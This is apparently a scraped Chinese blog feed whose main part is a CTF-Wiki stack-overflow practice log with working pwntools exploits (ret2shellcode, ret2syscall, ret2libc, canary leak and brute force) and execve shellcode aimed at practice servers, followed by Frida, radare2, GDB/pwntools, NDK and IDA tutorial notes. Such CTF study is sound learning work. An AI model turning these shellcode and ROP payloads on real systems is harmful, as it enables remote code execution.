buf存放到.bss段的[0x804a080:4]位置。\n调试看所在.bss段是否有执行的权限。\npayload:\n1 2 3 4 5 6 7 8 9 10 11 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # sh = process(./ret2shellcode) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10002) ## 获得system(\u0026#34;bin/sh\u0026#34;)的asm shellcode = asm(shellcraft.sh()) buf2_addr = 0x804a080 # sh.sendline(shellcode+\u0026#34;\\x90\u0026#34;*(112-len(shellcode))+p32(buf2_addr)) sh.sendline(shellcode.ljust(112,\u0026#34;A\u0026#34;)+p32(buf2_addr)) sh.interactive() 练习题：sniperoj-pwn100-shellcode-x86-64\n偏移：var void *buf @ rbp-0x10 shellcode可用空间：16+8=24\n找shellcode https://www.exploit-db.com/\nhttp://shell-storm.org/shellcode/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 .global _start _start: # char *const argv[] xorl %esi, %esi # \u0026#39;h\u0026#39; \u0026#39;s\u0026#39; \u0026#39;/\u0026#39; \u0026#39;/\u0026#39; \u0026#39;n\u0026#39; \u0026#39;i\u0026#39; \u0026#39;b\u0026#39; \u0026#39;/\u0026#39; movq $0x68732f2f6e69622f, %rbx # for \u0026#39;\\x00\u0026#39; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq $59 popq %rax # char *const envp[] xorl %edx, %edx syscall */ /* gcc -z execstack push64.c uname -r 3.19.3-3-ARCH */ shellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\u0026#34; \u0026#34;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34;; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;x64\u0026#39;,os = \u0026#39;linux\u0026#39; ) io = process(\u0026#39;./shellcode\u0026#39;) # io = remote(\u0026#34;47.106.212.155\u0026#34;,10003) shellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34; io.recvuntil(\u0026#39;[\u0026#39;) buf_addr = io.recvuntil(\u0026#39;]\u0026#39;,drop=True) buf_addr = int(buf_addr,16) # print(buf_addr) payload = \u0026#34;A\u0026#34;*24 + p64(buf_addr+32) + shellcode # 32是24字节的填充数据长度加返回地址长度24+8 print payload io.sendline(payload) io.interactive() ret2syscall 控制程序执行系统调用\nret2syscall\n相对ebp的偏移为0x64=108 覆盖范围为+4=112\n没法ret2text,也没法ret2shellcode\n只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用\n1 execve(\u0026#34;/bin/sh\u0026#34;,NULL,NULL) 使用ROPgadget寻找gadgets\n这样就能够控制到eax,ebx,ecx,edx寄存器。\n写payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # io = process(./ret2syscall) io = remote(\u0026#34;47.106.212.155\u0026#34;,10004) pop_eax_addr = 0x080bb196 pop_ebcdx_addr = 0x0806eb90 int_0x80_addr = 0x08049421 bin_sh_addr = 0x080BE408 payload = flat( [\u0026#34;A\u0026#34;*112,pop_eax_addr,0xb,pop_ebcdx_addr,0,0,bin_sh_addr,int_0x80_addr] ) io.sendline(payload) io.interactive() ret2libc ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。\neg1: ret2libc1\n1 2 3 4 5 6 7 8 9 10 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;RET2LIBC \u0026gt;_\u0026lt;\u0026#34;); gets(\u0026amp;s); return 0; } exp1:\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * # io = process(\u0026#39;./ret2libc1\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10006) binsh_addr = 0x08048720 sym_plt_addr = 0x08048460 payload = flat([112*\u0026#39;A\u0026#39;,sym_plt_addr,\u0026#39;b\u0026#39;*4,binsh_addr]) # \u0026#39;bbbb\u0026#39; 作为函数调用栈返回地址的虚假的地址 io.sendline(payload) io.interactive() eg2:\nret2libc2\n缺少/bin/sh 只能自己寻找gadgets来进行构造。\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * # io = process(\u0026#39;./ret2libc2\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10007) # binsh_addr = 0x08048720 sym_plt_addr = 0x08048490 sym_imp_gets_addr = 0x08048460 pop_ebx_addr = 0x0804872f buf2_addr = 0x804a080 payload = flat([\u0026#34;A\u0026#34;*112,sym_imp_gets_addr,pop_ebx_addr,buf2_addr,sym_plt_addr,\u0026#39;x\u0026#39;*4,buf2_addr]) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.interactive() eg3:\nret2libc3\n2的基础上去掉了system的地址。\ngot 表泄露libc的函数地址\n利用思路：\n泄露 __libc_start_main 地址\n获取 libc 版本\n获取 system 地址与 /bin/sh 的地址\n再次执行源程序\n触发栈溢出执行 system(‘/bin/sh’)\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * from LibcSearcher import LibcSearcher context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # io = process(\u0026#39;./ret2libc3\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10008) elf = ELF(\u0026#39;./ret2libc3\u0026#39;) puts_plt = elf.plt[\u0026#39;puts\u0026#39;] start_main_got = elf.got[\u0026#39;__libc_start_main\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] payload = flat([\u0026#34;A\u0026#34;*112,puts_plt,main,start_main_got]) io.sendlineafter(\u0026#34;Can you find it !?\u0026#34;,payload) libc_start_main_addr = u32(io.recv()[0:4]) libc = LibcSearcher(\u0026#39;__libc_start_main\u0026#39;,libc_start_main_addr) libcbase = libc_start_main_addr-libc.dump(\u0026#34;__libc_start_main\u0026#34;) sym_addr = libcbase+libc.dump(\u0026#39;system\u0026#39;) binsh_addr = libcbase+libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = flat([\u0026#34;A\u0026#34;*112,sym_addr,\u0026#34;bbbb\u0026#34;,binsh_addr]) io.sendline(payload) io.interactive() 中级ROP ret2csu 利用 x64 下的 __libc_csu_init 中的 gadgets.\neg:level5:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #undef _FORTIFY_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void vulnerable_function() { char buf[128]; read(STDIN_FILENO, buf, 512); } int main(int argc, char** argv) { write(STDOUT_FILENO, \u0026#34;Hello, World\\n\u0026#34;, 13); vulnerable_function(); } exp:\nret2reg 略 无题目 BROP 略 无二进制 高级ROP ret2_dl_runtime_resolve XDCTF2015-pwn200\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void vuln() { char buf[100]; setbuf(stdin, buf); read(0, buf, 256); } int main() { char buf[100] = \u0026#34;Welcome to XDCTF2015~!\\n\u0026#34;; setbuf(stdout, buf); write(1, buf, strlen(buf)); vuln(); return 0; } //gcc -o bof -m32 -fno-stack-protector bof.c SROP ret2VDSO 花式栈溢出 stack pivoting X-CTF Quals 2016 - b0verfl0w\n转移堆：EkoPartyCTF 2016 fuckzing-exploit-200\nframe faking 2018 安恒杯 over\n直接EXP 分析，，困扰了很久的exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from pwn import * context.binary = \u0026#34;./over.over\u0026#34; def DEBUG(cmd): raw_input(\u0026#34;DEBUG: \u0026#34;) gdb.attach(io, cmd) io = process(\u0026#34;./over.over\u0026#34;) elf = ELF(\u0026#34;./over.over\u0026#34;) libc = elf.libc io.sendafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;a\u0026#39; * 80) stack = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6: ].ljust(8, \u0026#39;\\0\u0026#39;)) - 0x70 success(\u0026#34;stack -\u0026gt; {:#x}\u0026#34;.format(stack)) # DEBUG(\u0026#34;b *0x4006B9\\nc\u0026#34;) 96 io.sendafter(\u0026#34;\u0026gt;\u0026#34;, flat([\u0026#39;11111111\u0026#39;, 0x400793, elf.got[\u0026#39;puts\u0026#39;], elf.plt[\u0026#39;puts\u0026#39;], 0x400676, (80 - 40) * \u0026#39;1\u0026#39;, stack, 0x4006be])) libc.address = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6: ].ljust(8, \u0026#39;\\0\u0026#39;)) - libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc.address -\u0026gt; {:#x}\u0026#34;.format(libc.address)) pop_rdi_ret=0x400793 \u0026#39;\u0026#39;\u0026#39; $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026#34;pop|ret\u0026#34; 0x00000000000f5279 : pop rdx ; pop rsi ; ret \u0026#39;\u0026#39;\u0026#39; pop_rdx_pop_rsi_ret=libc.address+0xf5279 payload=flat([\u0026#39;22222222\u0026#39;, pop_rdi_ret, next(libc.search(\u0026#34;/bin/sh\u0026#34;)),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym[\u0026#39;execve\u0026#39;], (80 - 7*8 ) * \u0026#39;2\u0026#39;, stack - 0x30, 0x4006be]) io.sendafter(\u0026#34;\u0026gt;\u0026#34;, payload) io.interactive() Stack smash 35c3 CTF readme\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * addr_ow_flag = 0x600d20 addr_flag = 0x400d20 H,P = \u0026#39;localhost\u0026#39;, 6666 #r = process(\u0026#39;./readme.bin\u0026#39;) r = remote(H,P) junk = r.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) exploit = \u0026#34;A\u0026#34;*0x218 exploit += p64(addr_flag) exploit += p64(0) exploit += p64(addr_ow_flag) r.sendline(exploit) junk += r.recvuntil(\u0026#34;Please overwrite the flag: \u0026#34;) exploit = \u0026#34;LIBC_FATAL_STDERR_=1\u0026#34; r.sendline(exploit) junk += r.recvall() print junk 栈上partial overwrite 2018 安恒杯 babypie\n2018 XNUCA-gets\nCanary 绕过技术 泄露栈中的Canary\n覆盖 Canary 的低字节，来打印出剩余的 Canary 部分\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // ex2.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void getshell(void) { system(\u0026#34;/bin/sh\u0026#34;); } void init() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } void vuln() { char buf[100]; for(int i=0;i\u0026lt;2;i++){ read(0, buf, 0x200); printf(buf); } } int main(void) { init(); puts(\u0026#34;Hello Hacker!\u0026#34;); vuln(); return 0; } EXP\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/env python from pwn import * context.binary = \u0026#39;ex2\u0026#39;#全局系统自动设置，为官方推荐设置，ex2为文件名称。 #context.log_level = \u0026#39;debug\u0026#39;#debug模式下才开启 io = process(\u0026#39;./ex2\u0026#39;) #本地连接到ex2 get_shell = ELF(\u0026#34;./ex2\u0026#34;).sym[\u0026#34;getshell\u0026#34;] #由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。 io.recvuntil(\u0026#34;Hello Hacker!\\n\u0026#34;)#接受传来的第一部分字符 # leak Canary payload = \u0026#34;A\u0026#34;*100 io.sendline(payload) #传输100个A io.recvuntil(\u0026#34;A\u0026#34;*100) Canary = u32(io.recv(4))-0xa #因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a log.info(\u0026#34;Canary:\u0026#34;+hex(Canary))#日志记录下canary # Bypass Canary payload = \u0026#34;\\x90\u0026#34;*100+p32(Canary)+\u0026#34;\\x90\u0026#34;*12+p32(get_shell)#发送最后的payload io.send(payload) io.recv() io.interactive() one-by-one 爆破 Canary\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 print \u0026#34;[+] Brute forcing stack canary \u0026#34; start = len(p) stop = len(p)+8 while len(p) \u0026lt; stop: for i in xrange(0,256): res = send2server(p + chr(i)) if res != \u0026#34;\u0026#34;: p = p + chr(i) #print \u0026#34;\\t[+] Byte found 0x%02x\u0026#34; % i break if i == 255: print \u0026#34;[-] Exploit failed\u0026#34; sys.exit(-1) canary = p[stop:start-1:-1].encode(\u0026#34;hex\u0026#34;) print \u0026#34; [+] SSP value is 0x%s\u0026#34; % canary劫持__stack_chk_fail 函数\n覆盖 TLS 中储存的 Canary 值\n","date":"2019-02-20T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/","title":"CTF-PWN刷题记录-CTFWiki_1栈溢出"},{"content":"Frida从入门到放弃_2(待补充) 0x00 前言 复习一下Android安装frida命令\n1 2 3 4 adb root adb push frida-server /data/local/tmp adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; adb shell \u0026#34;/data/local/tmp/frida-server \u0026amp;\u0026#34; 常用Frida 命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 frida-ps -U #列出USB设备运行ing的进程 frida-ps -Ua #列出运行中的应用 frida-ps -Uai #列出已安装的应用列表 frida-ps -D xxx #连接指定的设备 frida-ps -R #在Safari中跟踪recv*和send* API frida-trace -i \u0026#34;recv*\u0026#34; -i \u0026#34;send\u0026#34; Safari #在Safari中跟踪ObjC方法调用 frida-trace -m \u0026#34;-[NSView drawRect:]\u0026#34; Safari #在iPhone上启动SnapChat，跟踪加密API调用 frida-trace -U -f com.app.testing -I \u0026#34;libcommonCrypto*\u0026#34; #当程序启动时，frida跟踪所有open function frida-trace -U -i open com.app.testing 下面通过自己创建一个Android APP来学习Frida在Android上的一般用法。\n0x01 简单用例 Frida常用的两种启动方式：\npython 绑定启动 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import frida import sys,os ## package name pkg_name = \u0026#34;com.example.xxx\u0026#34; js_hook_file = \u0026#34;xxx.js\u0026#34; def on_message(message,data): if message[\u0026#39;type\u0026#39;] == \u0026#39;send\u0026#39;: print(\u0026#34;[*] {0}\u0026#34;.format(message[\u0026#39;payload\u0026#39;])) else: print(message) ## 插入js代码 or 加载js文件 jscode = \u0026#34;\u0026#34; script = \u0026#34;\u0026#34; process = frida.get_usb_device().attach(pkg_name) with open(js_hook_file,\u0026#34;r\u0026#34;) as f: script = process.create_script(f.read()) script.on(\u0026#39;message\u0026#39;, on_message) script.load() sys.stdin.read() 1 2 3 4 5 console.log(\u0026#34;Script loaded successfully \u0026#34;); Java.perform(function x() { //hook代码 }); 直接命令加载脚本启动 1 frida -U -l xxx.js com.example.xxx 0x02 App源码 java层\nnative层\n0x03 Java层hook HOOK代码\n0x04 Native层hook native层代码\n0x05 总结 源代码地址：\n0x06 参考 https://www.freebuf.com/articles/system/190565.html\nhttps://blog.csdn.net/jiangwei0910410003/article/details/80372118\nhttps://github.com/dweinstein/awesome-frida\n","date":"2019-02-02T00:00:00+08:00","permalink":"https://ykiko.top/p/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2%E5%BE%85%E8%A1%A5%E5%85%85/","title":"Frida从入门到放弃_2(待补充)"},{"content":"Frida从入门到放弃_1（重置） 0x00 Frida Frida 官网：https://www.frida.re/\ngithub: https://github.com/frida/frida\nDynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.\nScriptable\nPortable\nFree\nBattle-tested\n0x01 安装 二进制安装 (推荐) pip install frida-tools 就一个命令搞定\nFailed to load the Frida native extension: DLL load failed: 找不到指定的模块\n报了这个错 查了大半天 原来我用的版本是基于python3.7编译的。我现在用的3.6.。。。。 绑定：二选一就行\n1 2 pip install frida # Python bindings npm install frida # Node.js bindings 手动编译 依赖：\npip3 install colorama prompt-toolkit pygments\nLinux make\nMacOS and iOS 1 2 3 export MAC_CERTID=frida-cert export IOS_CERTID=frida-cert make Windows 1 frida.sln #VS2017 0x02 Android环境 设备：小米mix2 运行Android9.0 MIUI10开发版已解锁root\nfrida-server: 用的arm64版本\nserver文件下载\n下载好对应的 frida-server 然后adb push 进去\nadb push frida-server /data/local/tmp\n然后chomd 755 frida-server修改权限\n运行./frida-server\nfrida-server\n这几个命令：\n1 2 3 4 adb root adb push frida-server /data/local/tmp adb shell \u0026#34;chmod 755 /data/local/tmp/frida-server\u0026#34; adb shell \u0026#34;/data/local/tmp/frida-server \u0026amp;\u0026#34; 查看架构：\naarch64\n0x03 简单测试 命令行运行frida-ps -U\nfrida-ps\n有显示就是连接成功\n接下来对浏览器进行简单测试\nfrida-trace -U -i open com.android.browser\n随便点一下浏览器\n测试Diva\nfrida-trace -U -i \u0026quot;open*\u0026quot; jakhar.aseem.diva\n进行Hook login.class checkout函数\n逆向过程略\nHOOK脚本：\n1 2 3 4 5 6 7 Java.perfrom(function(){ console.log(\u0026#34;######\u0026#34;) var logActivity = Java.use(\u0026#34;jakhar.aseem.diva.LogActivity\u0026#34;); logActivity.checkout.implementation = function(){ console.log(\u0026#34;Hook\u0026#34;) } }) 命令行载入脚本运行\nfrida -U jakhar.aseem.diva -l diva1.js --no-pause\n进入logging关卡 点击check out，成功hook到checkout函数。\n0x04 总结 算是简单的入门了frida。\nfrida还有很多厉害的功能。多读读官方文档，收货会更多。\n","date":"2019-01-22T00:00:00+08:00","permalink":"https://ykiko.top/p/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1%E9%87%8D%E7%BD%AE/","title":"Frida从入门到放弃_1（重置）"},{"content":"radare2+cutter使用指南 0x00 介绍 radare2 一个很实用的二进制分析和调试工具\ncutter 是r2的GUI版。\n0x01 安装 支持的平台有如下：\nWindows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD, Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.\nLinux平台下直接\n1 git clone https://github.com/radare/radare2cd radare2sys/install.sh //(or sys/user.sh) Windows下可以下载二进制安装包安装。官网下载\nWindows用户推荐使用Windows下的linux（wsl）来使用， win下更新慢。还是linux下用得舒服（方便，快捷）。\n0x03 工具介绍 r2常用的包含有一下组件：\nrax2 用于数值转换\nrasm2 反汇编和汇编\nrabin2 查看文件格式\nradiff2 对文件进行 diff\nragg2/ragg2­cc 开发shellcode工具\nrahash2 各种密码算法， hash算法\nradare2 整合了所有工具\n使用帮助直接-h\nrax2 rasm2 rabin2 eg: (-I)\nradiff2 ragg2/ragg2­cc rahash2 radare2 (最常用) 可缩写为r2 0x04 r2 实战学习 challenge来源于：http://reversing.kr\n先查看一下文件信息：\nGUI?:\n用r2载入，自动分析aaa命令：\nvv 命令查看界面：\n注意0x00401080 调用了GetDlgItemTextA\ns 调到main函数，查看main的汇编代码：\npdc查看伪代码：\n大写的VV命令查看图形界面 使用hijk来进行界面移动。\n看到调用地址0x401020，s跳过去 ；发现没解析 可使用af来解析。\n看到GetDlgTemTextA调用：\n函数调用\n差不多逻辑就是一直比对字符串，从第二位开始比最后第一位\n得到Ea5yR3versing\n命令记不住或者想知道有些什么命令可以用就可以加个？号查询\n0x05 Cutter的使用 多图待补 Radare2 Book\n","date":"2019-01-02T00:00:00+08:00","permalink":"https://ykiko.top/p/radare2-cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","title":"radare2+cutter使用指南"},{"content":"pytorch学习_1安装 前言 本来想着用tensorflow的 然而GPU版总是报各种各样的BUG\n所以打算入坑一下学pytorch\n配置：win10+i76700HQ+GTX1060+16G\n软件版本：CUDA10+python3.6+pytorch 1 源码编译\n尝试1：官方安装方法不支持 CUDA 10 太坑，社区有编译通过的，所以只有自己编译试试\n报各种异常，但是没停，那就等等\nCPU被占满，巨卡。\n一觉起来之后：安装失败\n尝试2：等着完全支持CUDA10之后在用GPU跑吧。\n妥协：用阿里云的学生服务器装了CPU的版本：顺便把TensorFlow 也给装了。。\n然而 在一个星期之后 pytorch1.0出来了 支持了CUDA10 nice\n1 2 pip3 install http://download.pytorch.org/whl/cu100/torch-1.0.0-cp36-cp36m-win_amd64.whl pip3 install torchvision 期间没有遇到任何问题 真舒畅。。。\n","date":"2018-12-08T00:00:00+08:00","permalink":"https://ykiko.top/p/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/","title":"pytorch学习_1安装"},{"content":"PWN_小tools的使用 GCC 编译常用命令 不带选项 gcc test.c 将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。 -o 指定生成的输出文件； gcc test.c -o test 将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。 -E 仅执行编译预处理； gcc -E test.c -o test.i 将test.c预处理输出test.i文件。 -S 将C代码转换为汇编代码； gcc -S test.i 将预处理输出文件test.i汇编成test.s文件。 -c 仅执行编译操作，不进行连接操作。 gcc -c test.s 将汇编输出文件test.s编译输出test.o文件。 -wall 显示警告信息； **无选项链接** gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。 -O 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长 gcc -O1 test.c -o test 关掉DEP/NX（堆栈不可执行） gcc -z execstack -o level level.c 关掉Stack Protector/Canary（栈保护） gcc -fno-stack-protector -o level level.c 关掉程序ASLR/PIE（程序随机化保护） gcc -no-pie level level.c 64位linux下面的GCC编译出一个32位可执行程序 gcc -m32 -z execstack -fno-stack-protector -o level level.c GDB常用调试命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 gcc -g main.c //在目标文件加入源代码的信息 gdb a.out (gdb) start //开始调试 (gdb) n //一条一条执行 (gdb) step/s //执行下一条，如果函数进入函数 (gdb) backtrace/bt //查看函数调用栈帧 (gdb) info/i locals //查看当前栈帧局部变量 (gdb) frame/f //选择栈帧，再查看局部变量 (gdb) print/p //打印变量的值 (gdb) finish //运行到当前函数返回 (gdb) set var sum=0 //修改变量值 (gdb) list/l 行号或函数名 //列出源码 (gdb) display/undisplay sum //每次停下显示变量的值/取消跟踪 (gdb) break/b 行号或函数名 //设置断点 (gdb) continue/c //连续运行 (gdb) info/i breakpoints //查看已经设置的断点 (gdb) delete breakpoints 2 //删除某个断点 (gdb) disable/enable breakpoints 3 //禁用/启用某个断点 (gdb) break 9 if sum != 0 //满足条件才激活断点 (gdb) run/r //重新从程序开头连续执行 (gdb) watch input[4] //设置观察点 (gdb) info/i watchpoints //查看设置的观察点 (gdb) x/7b input //打印存储器内容，b--每个字节一组，7--7组 (gdb) disassemble //反汇编当前函数或指定函数 (gdb) si // 一条指令一条指令调试 而 s 是一行一行代码 (gdb) info registers // 显示所有寄存器的当前值 (gdb) x/20 $esp //查看内存中开始的20个数 ni 单步执行不进入 si 单步执行并进入 disas addr 对地址addr处的指令进行反汇编，addr可以是函数名 checksec 查看elf编译的保护选项。 查壳 upx -d file\nobjjump objdump是二进制文件快速查看工具。 常用命令：\n1. `objdump -d [file]` 查看文件的所有汇编代码 1. `objdump -f [file]` 查看文件的每个文件的整体头部摘要 ####python\npython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | ./file python以命令方式执行并把结果传递给filepython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | xargs ./file python以命令方式执行并当作命令行参数传递给file，具体的是：“它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。”存在这个命令是因为很多的参数不支持以管道的方式传递。os.system() 创建一个子进程os.putenv(\u0026ldquo;name\u0026rdquo;, \u0026ldquo;value\u0026rdquo;) 添加一个环境变量\npwntools 参考 http://pwntools.readthedocs.io/en/stable/ （官网介绍）\n[http://brieflyx.me/2015/python-module/pwntools-intro/](http://brieflyx.me/2015/python-module/pwntools-intro/) [http://brieflyx.me/2015/python-module/pwntools-advanced/](http://brieflyx.me/2015/python-module/pwntools-advanced/) 一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。\n常用的模块有下面几个： - ==asm==:汇编与反汇编 - ==dynelf==:用于远程符号泄露，需要提供leak方法 - ==elf==:对elf文件进行操作 - ==gdb==:配合gdb进行调试 - ==memleak==:用于内存泄漏 - ==shellcraft==: shellcode的生成器 - ==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE - ==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等 pwndbg arena 堆检查\nmp 显示堆\nbins,fastbins,unsorted,smallbins,largebins\nheap\ntop_chunk\nprocinfo 查看当前进程状态\nrop rop --grep \u0026quot;pop rdi\u0026quot; -- --nojop --nosys --depth 2\nsearch search -s “/bin/sh”\nvvmap 虚拟内存映射\ntelescope 检查内存转储\n","date":"2018-10-22T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"PWN_小tools的使用"},{"content":"Android-ARM进阶 学习一些关于ARM的汇编结构特点，以及分析。理解一些结构最好的方法就是多去尝试动手做。。\nNDK-Build的使用 可以参考官方文档。\n创建一个Android项目\ncd 项目目录\n/ndk-build 。也可以将NDK-build加入环境变量。\n创建jni文件夹，添加 Android.mk和 Application.mk两个文件。（参考官方文档）\n1 2 3 4 5 6 7 8 9 //Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) # 要生成的.so库名称 LOCAL_MODULE := hello # c++文件 LOCAL_SRC_FILES := hello.cpp include $(BUILD_SHARED_LIBRARY) 1 2 3 4 //Application.mk APP_PLATFORM := android-17 # APP_ABI := all APP_ABI :=armeabi-v7a arm64-v8a 添加hello.cpp：\n1 2 3 4 5 6 7 8 9 10 11 12 #include\u0026lt;cstdio\u0026gt; int i,j; int num[] = {1,2,3,4,5}; int main() { /* code */ printf(\u0026#34;hello,world!\\n\u0026#34;); for(i=0;i\u0026lt;5;i++){ printf(\u0026#34;num value is %d\\n\u0026#34;,num[i]); } return 0; } ndk-build\npush 到Android设备运行\n这里ARM32位出现里非法引用（Illegal instruction）。。之后再试试\n改成ARM64之后又出现内存区段错误“Segmentation fault” 有毒呀。。可能是哪里设置有问题。。\narm-linux-gcc交叉编译器编译 arm-linux-gcc也能编译出ARM可执行文件。sudo apt install g++-arm-linux-gnueabihf\n或者下载二进制文件安装。\narm-linux-gnueabihf-g++ -static helloworld.cpp\npush进Android之后运行成功\n使用这个方法和用NDK-build编译的有差异。\nfor循环 待添加\nif-else 待添加\nwhile switch 优化 ###C++\nJNI API分析 //Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS)\n# 要生成的.so库名称\nLOCAL_MODULE := hello\n# c++文件\nLOCAL_SRC_FILES := hello.cpp include $(BUILD_SHARED_LIBRARY)\n","date":"2018-10-10T00:00:00+08:00","permalink":"https://ykiko.top/p/android-arm%E8%BF%9B%E9%98%B6/","title":"Android-ARM进阶"},{"content":"IDA_动态调试.so_基本步骤 IDA 动态调试.so 基本步骤 待补图 0x00 IDA快捷键 Shirt+F12 字符串窗口\nF5大法好 反汇编\nCtrl+S 查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug）\nG 快速跳转到对应地址。s\n调试-F7单步进入调试、F8单步、F9运行\n0x01 方法一 获取运行Android_server。\nandroid_server文件放在IDA安装目录下的注意版本的不同。\n之后只需 push android_server /data/local/tmp/。\n之后adb shell，su ，cd /data/local/tmp/。\n可能还得chmod 755 android_server 才有权限运行。\n建立通信、attach进程。\nadb forward tcp:23946 tcp:23946命令。\n在IDA的Debugger选项中attach进程。\n加载so、找函数下断点\n双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。\n0x02 方法二 无法加载so文件需要在加载之前断点。反调试之类\nDebug方式启动app。需要应用可调试开启\nadb shell am start -D -n 包名/.MainActivity\n方法一的1，2两步 勾选选项。\njdb attach程序\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n开始调试 同上\n","date":"2018-08-31T00:00:00+08:00","permalink":"https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/","title":"IDA_动态调试.so_基本步骤"},{"content":"Android应用安全防护和逆向分析-基础篇5-6 一、 